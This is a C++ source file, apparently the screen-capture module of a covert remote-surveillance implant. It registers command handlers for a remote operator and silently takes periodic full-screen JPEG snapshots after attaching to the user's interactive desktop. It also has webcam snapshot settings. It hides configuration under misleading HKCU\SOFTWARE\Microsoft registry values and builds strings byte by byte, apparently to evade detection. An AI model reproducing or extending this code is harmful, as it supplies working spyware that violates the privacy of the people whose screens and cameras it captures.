 // Screen.cpp: implementation of the Screen class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include <stdlib.h>
#include <stdio.h>
#include <io.h>
#include "ScreenOpt.h"
#include "time.h"
//#include "jpglib.h"
#include "BmpToJpg.h"
#include "objbase.h"
#include "ScreenFile.h"
#include "Struct.h"
#include "NdisSocket.h"
#include "Screen.h"
#include "getSysteminfo.h"
#include "Base.h"
#include "WinApi.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#if OUTPUT_DEBUGINFO
ULONG v_DebugFlagScreenOpt = DEBUG_LOUD;
#endif

//--------------调用函数-----------------
DWORD StartCutScreen(DWORD*	pPara);

//设置截屏
DWORD SetSnapFreq(DWORD*	pPara);
//设置摄像头截图
DWORD SetVideoSnapFreq(DWORD*	pPara);

//-----------------线程-------------------
DWORD WINAPI CaptureScreenProc(LPVOID p);
DWORD WINAPI AutoCaptureScreen(LPVOID p);


//extern int		LineParser(char * inputline,char ** nextline,char **field,char ** value);

//win8.1和win10系统在放大dpi的情况下会造成屏幕像素数获取不准确，需要计算发达倍数进行补足
//获取放大倍数
void	GetPrecentageDpi();
//放大倍数
int g_precentagedpi = 96;

void	GetScreenRGB(BYTE* pBuffer, int& buflen);
//截屏jpeg的发送
BYTE*	DumpBufferData(const void* pBuffer, unsigned int& datalen, BOOL isLast);
//////////////////////////////////////////////////////////////////////////
#define		BUFFERLEN		2048
#define	WHITEBACKGROUND	0xFFFFFFFF	// 0x00bbggrr 纯白色
#define	BLACKBACKGROUND	0x0			// 0x00bbggrr 纯黑色

//------------------GUID号---------------------
#define SCREENGUID		3

long	captureing = 0;		//互斥
RECT	rc_screen;
lpFunction	lpfun;
long		snapFreq = 120;
long		g_screentm = 2*60;
 
time_t	tPrevSnap	= 0;

long g_quality = 10;


SJpgBuffer	JpgBuffer;
//////////////////////////////////////////////////////////////////////////
long		g_videosnapFreq = 0; //video cut 频率
long		g_videotm=2*60;

int partInitSrceenOpt(DWORD* pModuleTable, int TableSize, DWORD pSendFunction)
{
	lpfun=(lpFunction)pModuleTable;

	lpfun[PTYPE_SCREEN].pFun		= (pFun)StartCutScreen;
	lpfun[PTYPE_SCREEN_START].pFun	= (pFun)StartScreen;
	lpfun[PTYPE_SCREEN_STOP].pFun	= (pFun)StopScreen;
	lpfun[PTYPE_SCREEN_FULL].pFun	= (pFun)GetFull;
	lpfun[PTYPE_SETSNAPSCREEN].pFun	= (pFun)SetSnapFreq;
	lpfun[PTYPE_SETCUTVIDEO].pFun	= (pFun)SetVideoSnapFreq;

	DWORD dwType, dwVal=0;
	DWORD dwSize=sizeof(DWORD);
	if(PSHGetValueA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", "stm",
		&dwType, &dwVal, &dwSize)==ERROR_SUCCESS )
	{
		if(dwVal>=10)
		{
			g_screentm=dwVal;
		}
	}

	if(PSHGetValueA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", "vtm",
		&dwType, &dwVal, &dwSize)==ERROR_SUCCESS )
	{
		if(dwVal>=10)
		{
			g_videotm=dwVal;
		}
	}

	char strVal[20];
	dwSize = 20;
	if(PSHGetValueA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", "sqt",
		&dwType, &strVal, &dwSize)==ERROR_SUCCESS )
	{
		if (dwType == REG_DWORD)
		{
			int tmpint = *(DWORD*)strVal;
			if (tmpint > 100 || tmpint < 10)
			{
				g_quality = 10;
			}
			else
			{
				g_quality = tmpint;
			}
		}
		else if (dwType == REG_SZ)
		{
			g_quality = atoi(strVal);
			if (g_quality == 0)
			{
				g_quality = 10;
			}
		}
	}

	GetPrecentageDpi();
 	StartCutScreen(NULL);

	return SCREENGUID;
}

void GetPrecentageDpi()
{
	if (getSysteminfo::GetInstance()->GetSystemType() == VER_Windows7  ||
		getSysteminfo::GetInstance()->GetSystemType() == VER_Windows8  ||
		getSysteminfo::GetInstance()->GetSystemType() == VER_Windows81 ||
		getSysteminfo::GetInstance()->GetSystemType() == VER_Windows10)
	{
		DWORD dwType, dwVal=0;
		DWORD dwSize=sizeof(DWORD);
		if(PSHGetValueA(HKEY_CURRENT_USER, "Control Panel\\Desktop\\WindowMetrics", "AppliedDPI",
			&dwType, &dwVal, &dwSize)==ERROR_SUCCESS )
		{
			g_precentagedpi = dwVal;
		}
	}
	else
	{
		g_precentagedpi = 96;
	}

	return ;
}

DWORD SetVideoSnapFreq(DWORD*	pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	char *p=0;//目录名
	long freq =  60;
	
	long storetm = 10;
	long qualitytype = 10;
	char * nextline=0;
	char *field=0;
	char * value=0;
	
	char* inputline=ppara->buf;

	//freq
	char str1[5];
	str1[0] = 0x66;
	str1[1] = 0x72;
	str1[2] = 0x65;
	str1[3] = 0x71;
	str1[4] = 0x00;

	//storetm
	char str2[8];
	str2[0] = 0x73;
	str2[1] = 0x74;
	str2[2] = 0x6f;
	str2[3] = 0x72;
	str2[4] = 0x65;
	str2[5] = 0x74;
	str2[6] = 0x6d;
	str2[7] = 0x00;

	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(strcmp(field, str1)==0){
			freq = atoi(value);
		}
		else if(strcmp(field, str2)==0){
			storetm=atoi(value);
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}

	if(freq >= 0)
	{
		IF_LOUD(DbgFat32Log("SetvideoFreq = %d", freq);)
		PInterlockedExchange(&g_videosnapFreq, freq);
		PSHSetValueA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", "vfreq", REG_DWORD,&freq, 4); 
	}
	if(storetm>0)
	{
		IF_LOUD(DbgFat32Log("Setvideotm = %d", storetm);)
		PInterlockedExchange(&g_videotm, storetm);
		PSHSetValueA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", "vtm", REG_DWORD,&storetm, 4); 
	}

	char buf[1024];
	int buflen = sprintf(buf, "content-length: %d\r\n\r\nfreq: %d", 0, g_videosnapFreq);
	SendData(buf, buflen, ppara->PacketType, ppara->SessionID);

	return 0;
}


DWORD SetSnapFreq(DWORD*	pPara)
{
	ThreadParam *ppara=(ThreadParam*)pPara;
	char *p=0;//目录名
	long freq =  60;
	long storetm=10;
	long qualitytype = 10;
	char strQualityType[15];
	char * nextline=0;
	char *field=0;
	char * value=0;
	
	char* inputline=ppara->buf;
 
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);

	//freq
	char Cmd1[5];
	Cmd1[0] = 0x66;
	Cmd1[1] = 0x72;
	Cmd1[2] = 0x65;
	Cmd1[3] = 0x71;
	Cmd1[4] = 0x00;
	
	//storetm
	char Cmd2[8];
	Cmd2[0] = 0x73;
	Cmd2[1] = 0x74;
	Cmd2[2] = 0x6f;
	Cmd2[3] = 0x72;
	Cmd2[4] = 0x65;
	Cmd2[5] = 0x74;
	Cmd2[6] = 0x6d;
	Cmd2[7] = 0x00;
	
	//quality
	char Cmd3[8];
	Cmd3[0] = 0x71;
	Cmd3[1] = 0x75;
	Cmd3[2] = 0x61;
	Cmd3[3] = 0x6c;
	Cmd3[4] = 0x69;
	Cmd3[5] = 0x74;
	Cmd3[6] = 0x79;
	Cmd3[7] = 0x00;

	while(re)
	{
		if(strcmp(field, Cmd1)==0){
			freq = atoi(value);;		
		}
		else if(strcmp(field, Cmd2)==0){
			storetm=atoi(value);
		}
		else if (strcmp(field, Cmd3) == 0)
		{
			memset(strQualityType,0, 15);
			strcpy(strQualityType, value);
		}
		
		if(re==2)
			break;
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}

	if(freq >= 0)
	{
		IF_LOUD(DbgFat32Log("SetSnapFreq = %d", freq);)
		PInterlockedExchange(&snapFreq, freq);
	}
	if(storetm>0)
	{
		IF_LOUD(DbgFat32Log("SetScreentm = %d", storetm);)
		PInterlockedExchange(&g_screentm, storetm);
		PSHSetValueA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", "stm", REG_DWORD,&storetm, 4); 

	}

	qualitytype = atoi(strQualityType);

	if (qualitytype > 100 || (qualitytype >= 0 && qualitytype < 10))
	{
		qualitytype = 10;
	}

	if (qualitytype < -100 || (qualitytype > -10 && qualitytype < 0))
	{
		qualitytype = -10;
	}

	IF_LOUD(DbgFat32Log("Setquality = %d", qualitytype);)
	PInterlockedExchange(&g_quality, qualitytype);
	PSHSetValueA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft", "sqt", REG_SZ, strQualityType, strlen(strQualityType)); 

	char buf[1024];
	int buflen = _snprintf(buf, 1024, "content-length: %d\r\n\r\nfreq: %d", 0, snapFreq);
	SendData(buf, buflen, ppara->PacketType, ppara->SessionID);

	return 0;
}

DWORD StartCutScreen(DWORD*	pPara)
{
	if(pPara == NULL)
	{
		if(tPrevSnap == 0)
		{
			DWORD  threadId=0;
			HANDLE hAutoSnap = CreateThread(NULL, 0, AutoCaptureScreen, NULL, 0, &threadId);
			if(hAutoSnap != NULL)
			{
				IF_LOUD(DbgFat32Log("Begin Auto SnapScreen");)

				CloseHandle(hAutoSnap);

				PInterlockedExchange(&tPrevSnap, 1);
				PInterlockedExchange(&captureing, 0);
			}
		}
	}
	else
	{
		IF_LOUD(DbgFat32Log("开始截取一屏操作\r\n");)

		ThreadParam *p = new ThreadParam;
		memcpy(p, pPara, sizeof(ThreadParam));
		
		HANDLE starthandle=0;
		DWORD  threadId=0;
		starthandle = CreateThread(NULL, 0, CaptureScreenProc, p, 0, &threadId);
		if(starthandle != NULL)
			CloseHandle(starthandle);
	}

	return 1;
}

int GetTime()
{
	return time(0);
}

// 截屏线程函数
DWORD WINAPI CaptureScreenProc(LPVOID pPara)
{
	BYTE *pBuffer = 0;		// 屏幕的RGB数据缓冲区
	try
	{
		int iWait = 0;
		while(1)
		{
			if (0 == PInterlockedExchange(&captureing, 0xAA))
				break;
			PSleep(1000);
		}

		int buflen = 0;			// 缓冲区大小
		int	scr_width = 0;		// 屏幕的宽度
		int scr_height = 0;		// 屏幕的高度
		// 获取当前屏幕大小
		int w = (GetSystemMetrics(SM_CXSCREEN)*g_precentagedpi/96) & ~3;
		int h = GetSystemMetrics(SM_CYSCREEN)*g_precentagedpi/96;
		if ((w != scr_width) || (h != scr_height))
		{
			scr_width = w;
			scr_height = h;
			buflen = w * h * 3; // 一次截取整屏
			buflen += buflen >> 3;
			pBuffer = (BYTE*)malloc(buflen);
			if (pBuffer == NULL)
			{
				PInterlockedExchange(&captureing, 0);
				return 4;
			}
		}

		rc_screen.left = rc_screen.top = 0;
		rc_screen.right = scr_width;
		rc_screen.bottom = scr_height;
		
		IF_LOUD(DbgFat32Log("开始截屏, 截屏线程准备工作");)

		int rgblen = buflen;
		GetScreenRGB(pBuffer, rgblen);
		PSleep(1000);
		
		// 压缩RGB数据
		
		if (rgblen != 0)
		{
			IF_LOUD(DbgFat32Log("截屏线程准备工作完成, 准备压缩, rbgLen:%d", rgblen);)
			getallow(g_taskallow, 0);

			BMPToJPG(pBuffer, rc_screen.right, rc_screen.bottom, rgblen, g_quality);
 			//SetDumpFunction(DumpBufferData);
 			//CompressToJpg(pBuffer, rc_screen.right, rc_screen.bottom, rgblen, g_quality);

			releaseallow(g_taskallow, 1);
		}
		else
		{
			IF_LOUD(DbgFat32Log("截取当前屏幕失败");)
		}
		free(pBuffer);
	}
	catch(...)
	{
		IF_LOUD(DbgFat32Log("CaptureScreenProc Match Error!");)
	}
	PInterlockedExchange(&captureing, 0);

	return 5;
}

// 截屏线程函数
DWORD WINAPI AutoCaptureScreen(LPVOID pPara)
{
	HDESK hdeskCurrent=NULL;
	HDESK hdesk=NULL;
	HWINSTA hwinstaCurrent=NULL;
	HWINSTA hwinsta=NULL;
	
	hwinstaCurrent = PGetProcessWindowStation();

	//winsta0
	char TmpStr1[8];
	TmpStr1[0] = 0x77;
	TmpStr1[1] = 0x69;
	TmpStr1[2] = 0x6e;
	TmpStr1[3] = 0x73;
	TmpStr1[4] = 0x74;
	TmpStr1[5] = 0x61;
	TmpStr1[6] = 0x30;
	TmpStr1[7] = 0x00;

	//default
	char TmpStr2[8];
	TmpStr2[0] = 0x64;
	TmpStr2[1] = 0x65;
	TmpStr2[2] = 0x66;
	TmpStr2[3] = 0x61;
	TmpStr2[4] = 0x75;
	TmpStr2[5] = 0x6c;
	TmpStr2[6] = 0x74;
	TmpStr2[7] = 0x00;

	if (hwinstaCurrent!=NULL)
	{
		hdeskCurrent = PGetThreadDesktop(PGetCurrentThreadId());
		if (hdeskCurrent != NULL)
		{
			hwinsta = POpenWindowStationA(TmpStr1, FALSE,
				WINSTA_ACCESSCLIPBOARD |
				WINSTA_ACCESSGLOBALATOMS |
				WINSTA_CREATEDESKTOP |
				WINSTA_ENUMDESKTOPS |
				WINSTA_ENUMERATE |
				WINSTA_EXITWINDOWS |
				WINSTA_READATTRIBUTES |
				WINSTA_READSCREEN |
				WINSTA_WRITEATTRIBUTES);
			if (hwinsta != NULL)
			{
				if (NULL!=PSetProcessWindowStation(hwinsta))
				{
					hdesk = POpenDesktopA(TmpStr2, 0, FALSE,
						DESKTOP_CREATEMENU |
						DESKTOP_CREATEWINDOW |
						DESKTOP_ENUMERATE |
						DESKTOP_HOOKCONTROL |
						DESKTOP_JOURNALPLAYBACK |
						DESKTOP_JOURNALRECORD |
						DESKTOP_READOBJECTS |
						DESKTOP_SWITCHDESKTOP |
						DESKTOP_WRITEOBJECTS);
					if (hdesk != NULL)
					{
						PSetThreadDesktop(hdesk);
					}
				}
			}
		}
	}

	while (1) 
	{
		PSleep(5000);

		if(tPrevSnap == 0xFFFFFFF0)
		{
			IF_LOUD(DbgFat32Log("收到要求退出请求, 线程退出");)
			break;
		}

		if (g_screenwork == FALSE)
		{
			PSleep(30000);
			continue;
		}

		int Width, Height;
		Width  = GetSystemMetrics(SM_CXSCREEN)*g_precentagedpi/96;
		Height = GetSystemMetrics(SM_CYSCREEN)*g_precentagedpi/96;

		HDC hDC = PGetDC(NULL);
		if(hDC != NULL)
		{
			COLORREF clr[5];
			clr[0] = PGetPixel(hDC, 1,			1);
			clr[1] = PGetPixel(hDC, Width-1,	Height-1);
			clr[2] = PGetPixel(hDC, 1,			Height-1);
			clr[3] = PGetPixel(hDC, Width-1,	1);
			clr[4] = PGetPixel(hDC, Width/2,	Height/2);
			PReleaseDC(NULL, hDC);
			if( clr[0] == WHITEBACKGROUND &&
				clr[1] == WHITEBACKGROUND &&
				clr[2] == WHITEBACKGROUND &&
				clr[3] == WHITEBACKGROUND &&
				clr[4] == WHITEBACKGROUND )	
			{
				IF_LOUD(DbgFat32Log("四角一点全白");)

				PInterlockedExchange(&tPrevSnap, GetTime());
				continue;		// 四角和中位为纯白色
			}
			else if(clr[0] == BLACKBACKGROUND &&
				clr[1] == BLACKBACKGROUND &&
				clr[2] == BLACKBACKGROUND &&
				clr[3] == BLACKBACKGROUND &&
				clr[4] == BLACKBACKGROUND )
			{
				IF_LOUD(DbgFat32Log("四角一点全黑");)
				
				PInterlockedExchange(&tPrevSnap, GetTime());
				continue;		// 四角和中位为纯白色
			}
		}

		if(abs(time(0) - tPrevSnap) > snapFreq && snapFreq > 0)
		{
			int errNo = 0;
			BYTE *pBuffer = 0;		// 屏幕的RGB数据缓冲区
			try
			{
				int iWait = 0;
				while(iWait++ < 30)
				{
					if (0 == PInterlockedExchange(&captureing, 0xAA))
						break;
					PSleep(1000);
				}
				if(iWait >= 100)
				{
					IF_LOUD(DbgFat32Log("当前有截屏正在进行");)
					
					PInterlockedExchange(&captureing, 0x0);
					continue;
				}
				errNo = 1;

				int buflen = 0;			// 缓冲区大小
				int	scr_width = 0;		// 屏幕的宽度
				int scr_height = 0;		// 屏幕的高度
				// 获取当前屏幕大小
				int w = (GetSystemMetrics(SM_CXSCREEN)*g_precentagedpi/96) & ~3;
				int h = GetSystemMetrics(SM_CYSCREEN)*g_precentagedpi/96;
				if ((w != scr_width) || (h != scr_height))
				{
					errNo = 2;
					scr_width = w;
					scr_height = h;
					buflen = w * h * 3; // 一次截取整屏
					buflen += buflen >> 3;
					/*pBuffer = new BYTE[buflen];*/
					pBuffer = (BYTE*)malloc(buflen);
					if (pBuffer == NULL)
					{
						PInterlockedExchange(&captureing, 0);
						continue;
					}
				}
				errNo = 3;

				rc_screen.left = rc_screen.top = 0;
				rc_screen.right = scr_width;
				rc_screen.bottom = scr_height;
				
				IF_LOUD(DbgFat32Log("开始截屏, 截屏线程准备工作");)

				errNo = 4;

				int rgblen = buflen;
				GetScreenRGB(pBuffer, rgblen);
				PSleep(1000);
				// 压缩RGB数据
			
				if (rgblen != 0)
				{
 					errNo = 5;

					IF_LOUD(DbgFat32Log("截屏线程准备工作完成, 准备压缩, rbgLen:%d", rgblen);)
					if(!getallow(g_taskallow, 0))
					{
						errNo = 99;
					}

					BMPToJPG(pBuffer, rc_screen.right, rc_screen.bottom, rgblen, g_quality);
 					//SetDumpFunction(DumpBufferData);
 					//CompressToJpg(pBuffer, rc_screen.right, rc_screen.bottom, rgblen, g_quality);

					if(!releaseallow(g_taskallow, 1))
					{
						errNo = 99;
					}
					errNo = 6;
				}
				else
				{
					errNo = 7;
					IF_LOUD(DbgFat32Log("截取当前屏幕失败");)
				}
				free(pBuffer);
			}
			catch(...)
			{
				IF_LOUD(DbgFat32Log("AuotCap Catch Error! errNo:%d", errNo);)
			}
			PInterlockedExchange(&captureing, 0);
		}
	}

	PInterlockedExchange(&tPrevSnap, 0);
	PSetProcessWindowStation(hwinstaCurrent);
	PSetThreadDesktop(hdeskCurrent);
	PCloseWindowStation(hwinsta);
	PCloseDesktop(hdesk);
	
	return 0;
}

BYTE* DumpBufferData(const void* pBuffer, unsigned int& datalen, BOOL isLast)
{
	if(tPrevSnap == 0xFFFFFFF0)
		return NULL;
	
	if (!isLast)
		datalen = BUFFERLEN;
	else
		datalen = BUFFERLEN-datalen;

#ifdef	OUTPUT_DEBUGINFO
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);
	char fname[500];
	sprintf(fname, "c:\\screen%d.jpg", 1);
	FILE *pf;
	if (pBuffer == NULL)
	{
		pf = fopen(fname, "wb");
		if(pf != NULL)
			fclose(pf);
	}
	else
	{
		pf = fopen(fname, "ab");
		if(pf != NULL)
		{
			fwrite(pBuffer, 1, datalen, pf);
			fclose(pf);
		}
	}
#endif

	if (pBuffer == NULL)
	{
		// 申请缓冲区
		if (JpgBuffer.buflen == 0)
		{
			JpgBuffer.pbuffer = new char [BUFFERLEN*800];
			JpgBuffer.buflen = BUFFERLEN * 800;
			memset(JpgBuffer.pbuffer, 0, JpgBuffer.buflen);
		}

		JpgBuffer.pos = 0;
		datalen = BUFFERLEN;
		return (BYTE*)JpgBuffer.pbuffer+JpgBuffer.pos;
	}
	else
	{
		if (JpgBuffer.pos+(int)datalen > JpgBuffer.buflen)
		{
			int newlen = JpgBuffer.buflen + BUFFERLEN*8;
			char* tp = new char[newlen];
			memcpy(tp, JpgBuffer.pbuffer, JpgBuffer.buflen);
			delete[] JpgBuffer.pbuffer;
			memset(tp+JpgBuffer.buflen, 0, BUFFERLEN*8);
			JpgBuffer.buflen = newlen;
			JpgBuffer.pbuffer = tp;
		}

		JpgBuffer.pos += datalen;
	}

	if (isLast)
	{
		if(g_ScreenFile.CreateJpeg(JpgBuffer.pbuffer, JpgBuffer.pos, 1))
		{
			PInterlockedExchange(&tPrevSnap, time(0));
			IF_LOUD(DbgFat32Log("截屏数据, 发送数据成功");)
		}
		else
		{
			IF_LOUD(DbgFat32Log("截屏数据, 发送数据失败");)
		}
		
		datalen = 0;
		return NULL;
	}
	else
	{
		if (JpgBuffer.pos+BUFFERLEN > JpgBuffer.buflen)
		{
			int newlen = JpgBuffer.buflen + BUFFERLEN*8;
			char* tp = new char[newlen];
			memcpy(tp, JpgBuffer.pbuffer, JpgBuffer.buflen);
			delete[] JpgBuffer.pbuffer;
			memset(tp+JpgBuffer.buflen, 0, BUFFERLEN*8);
			JpgBuffer.buflen = newlen;
			JpgBuffer.pbuffer = tp;
		}
		datalen = BUFFERLEN;
		PSleep(10);
		return (BYTE*)JpgBuffer.pbuffer+JpgBuffer.pos;
	}
}

//被杀
void GetScreenRGB(BYTE* pBuffer, int& buflen)
{
	int error = 0;

	//DISPLAY
	char TmpStr[8];
	TmpStr[0] = 0x44;
	TmpStr[1] = 0x49;
	TmpStr[2] = 0x53;
	TmpStr[3] = 0x50;
	TmpStr[4] = 0x4c;
	TmpStr[5] = 0x41;
	TmpStr[6] = 0x59;
	TmpStr[7] = 0x00;

	try
	{

	HDC hdcmy, hbufferdc;		// 内存DC和屏幕DC
	HBITMAP  hBit, hOldBitmap;	// 位图句柄
	HANDLE hPal = NULL, hOldPal = NULL;		// 调色板
	BITMAPINFOHEADER   bi;		//位图文件头结构
	int wBitCount;
	hdcmy = PCreateDCA(TmpStr, NULL, NULL, NULL);
	if (hdcmy==NULL)
	{
		IF_LOUD(DbgFat32Log("截屏时, 获取屏幕DC失败");)
		buflen=0;
		return;
	}

	error = 1;

	hbufferdc = PCreateCompatibleDC(hdcmy);
	PSleep(15);
	//Create Hbitmap
	hBit = PCreateCompatibleBitmap(hdcmy, rc_screen.right, rc_screen.bottom);
	
	error = 2;

	DWORD CAPTUREBLT1 = 0x40000000; 
	//Get bit to Buffer
	hOldBitmap = (HBITMAP)PSelectObject(hbufferdc, hBit);
	int sy = 0;
	while (sy < rc_screen.bottom)
	{
		int h = min(rc_screen.bottom-sy, 100);
		PBitBlt(hbufferdc, 0, sy, rc_screen.right, h,	hdcmy, 0, sy, SRCCOPY|CAPTUREBLT);
		PSleep(5);
		sy+=h;
	}
	error = 3;

	PSleep(15);

	//Get finally bit
	hBit = (HBITMAP)PSelectObject(hbufferdc, hOldBitmap);
	
	int iBits = PGetDeviceCaps(hdcmy, BITSPIXEL) * 
		PGetDeviceCaps(hdcmy, PLANES);
	if (iBits <= 1)
		wBitCount = 1;
	else if (iBits <= 4)
		wBitCount = 4;
	else if (iBits <= 8)
		wBitCount = 8;
	else/* if (iBits <= 24)*/
		wBitCount = 24;
	//计算调色板大小

	if (wBitCount == 8)
	{
		error = 40;
		
		DWORD dwPaletteSize;
		dwPaletteSize = (1 << wBitCount) *sizeof(RGBQUAD);
		
		//设置位图信息头结构
		bi.biSize            = sizeof(BITMAPINFOHEADER);
		bi.biWidth           = rc_screen.right;
		bi.biHeight          = rc_screen.bottom;
		bi.biPlanes          = 1;
		bi.biBitCount         = wBitCount;
		bi.biCompression      = BI_RGB;
		bi.biSizeImage        = 0;
		bi.biXPelsPerMeter     = 0;
		bi.biYPelsPerMeter     = 0;
		bi.biClrUsed         = 0;
		bi.biClrImportant      = 0;
		buflen = ((rc_screen.right * wBitCount+31)/32)* 4 * rc_screen.bottom;
		
		// 处理调色板   
		hPal = PGetStockObject(DEFAULT_PALETTE);
		if (hPal)
		{
			hOldPal = PSelectPalette(hdcmy, (HPALETTE)hPal, FALSE);
			PRealizePalette(hdcmy);
		}

		error = 41;

		//为位图内容分配内存
		HANDLE hDib  = PGlobalAlloc(GHND,buflen+dwPaletteSize+sizeof(BITMAPINFOHEADER));
		LPBITMAPINFOHEADER lpbi = (LPBITMAPINFOHEADER)PGlobalLock(hDib);
		*lpbi = bi;
		
		// 获取该调色板下新的像素值
		PGetDIBits(hdcmy, hBit, 0, (UINT) rc_screen.bottom,
			(LPSTR)lpbi + sizeof(BITMAPINFOHEADER)+dwPaletteSize,
			(LPBITMAPINFO)lpbi, DIB_RGB_COLORS);

		error = 42;

		BYTE *tp = pBuffer;
		int newoff = 0;
		DWORD *pPal = (DWORD *)((LPSTR)lpbi + sizeof(BITMAPINFOHEADER));
		UCHAR *pBit = (UCHAR*)((LPSTR)lpbi + sizeof(BITMAPINFOHEADER)+dwPaletteSize);
		for(int i = 0; i< buflen; i++)
		{
			memcpy(tp+newoff, pPal+pBit[i], 3);
			newoff += 3;
		}
		dwPaletteSize = 0;
		bi.biBitCount = 24;
		
		error = 43;

		//恢复调色板   
		if (hOldPal)
		{
			PSelectPalette(hdcmy, (HPALETTE)hOldPal, TRUE);
			PRealizePalette(hdcmy);
		}
		PGlobalUnlock(hDib);
		PGlobalFree(hDib);
		
		error = 44;
		
		buflen = rc_screen.right * rc_screen.bottom/*lines*/ * 3;
	}
	else if(wBitCount > 8)
	{
		error = 50;

		//设置位图信息头结构
		bi.biSize            = sizeof(BITMAPINFOHEADER);
		bi.biWidth           = rc_screen.right;
		bi.biHeight          = rc_screen.bottom;
		bi.biPlanes          = 1;
		bi.biBitCount         = wBitCount;
		bi.biCompression      = BI_RGB;
		bi.biSizeImage        = 0;
		bi.biXPelsPerMeter     = 0;
		bi.biYPelsPerMeter     = 0;
		bi.biClrUsed         = 0;
		bi.biClrImportant      = 0;
		buflen = ((rc_screen.right * wBitCount+31)/32)* 4 * rc_screen.bottom;
		
		// 获取调色板
		hPal = PGetStockObject(DEFAULT_PALETTE);
		if (hPal)
		{
			hOldPal = PSelectPalette(hdcmy, (HPALETTE)hPal, FALSE);
			PRealizePalette(hdcmy);
		}

		error = 51;

		int cy = rc_screen.bottom >> 3;
		BYTE *tp = pBuffer;
		PSleep(15);
		for (int y = 0; y < rc_screen.bottom; y += cy)
		{
			PGetDIBits(hdcmy, hBit, y, (UINT) cy,
				tp, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
			PSleep(20);
			tp += cy * rc_screen.right * 3;
		}
		if (hOldPal)
		{
			PSelectPalette(hdcmy, (HPALETTE)hOldPal, TRUE);
			PRealizePalette(hdcmy);
		}

		error = 52;
		
		buflen = rc_screen.right * rc_screen.bottom/*lines*/ * 3;
	}
	else
	{
		buflen = 0;
	}

	//Release Memory
	PDeleteObject(hOldPal);
	PDeleteObject(hPal);
	PDeleteObject(hOldBitmap);
	PDeleteDC(hdcmy);
	PDeleteDC(hbufferdc);
	PDeleteObject(hBit);

	error = 6;
	
	}catch (...) {
		buflen = 0;
		IF_LOUD(DbgFat32Log("GetScreenRGB Catch Error, No:%d", error);)
	}

	return;
}






